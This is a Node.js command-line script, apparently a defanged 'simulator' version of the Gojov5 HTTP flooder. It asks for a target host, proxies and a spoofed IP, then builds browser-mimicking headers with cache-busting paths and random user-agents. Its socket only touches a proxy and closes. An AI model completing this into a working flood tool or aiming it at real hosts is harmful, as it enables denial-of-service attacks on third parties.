const { randstr, randomElement } = require('./utils');
const NetSocket = require('net').Socket;
const readline = require('readline');

// Fungsi utama untuk flood
function runFlooder(parsedTarget, proxies, spoofed, lang, encoding, accept, control) {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const headers = {
        ":method": "GET",
        ":authority": parsedTarget.host,
        ":path": parsedTarget.path + "?" + randstr(5) + randstr(25),
        ":scheme": "https",
        "x-forwarded-proto": "https",
        "accept-language": lang,
        "accept-encoding": encoding,
        "cache-control": control,
        "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "origin": "https://" + parsedTarget.host,
        "upgrade-insecure-requests": "1",
        "accept": accept,
        "user-agent": randstr(15),
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "TE": "trailers",
        "sec-fetch-user": "?1",
        "x-requested-with": "XMLHttpRequest"
    };

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443"
    };

    console.log("🔗 Target:", parsedTarget.host);
    console.log("🌐 Proxy:", proxyAddr);
    console.log("📩 Headers:", headers);
    console.log("✅ Simulasi koneksi dibuat ke", proxyOptions.address);
    
    // Contoh simulasi socket (tidak benar-benar mengirimkan traffic)
    const socket = new NetSocket();
    socket.connect(proxyOptions.port, proxyOptions.host, () => {
        console.log("📡 Terhubung ke proxy:", proxyOptions.host);
        socket.end();
    });
}

// CLI input
function startCLI() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    rl.question("🌐 Masukkan target host (tanpa https://): ", (host) => {
        rl.question("📍 Masukkan path target (mis: /): ", (path) => {
            rl.question("🛡️ Masukkan spoofed IP (dummy, misal 1.1.1.1): ", (spoofed) => {
                rl.question("🌍 Masukkan bahasa (mis: en-US): ", (lang) => {
                    rl.question("📦 Encoding (mis: gzip, deflate): ", (encoding) => {
                        rl.question("📥 Accept header (mis: */*): ", (accept) => {
                            rl.question("🚫 Cache-Control (mis: no-cache): ", (control) => {
                                rl.question("🔌 Masukkan daftar proxy dipisah koma (IP:PORT,IP:PORT): ", (proxyInput) => {
                                    const proxies = proxyInput.split(",");
                                    const parsedTarget = { host, path };
                                    rl.close();
                                    runFlooder(parsedTarget, proxies, spoofed, lang, encoding, accept, control);
                                });
                            });
                        });
                    });
                });
            });
        });
    });
}

// Eksekusi langsung jika dijalankan sebagai file utama
if (require.main === module) {
    console.clear();
    console.log("🚀 Gojov5 Flooder Simulator by Arby\n");
    startCLI();
}
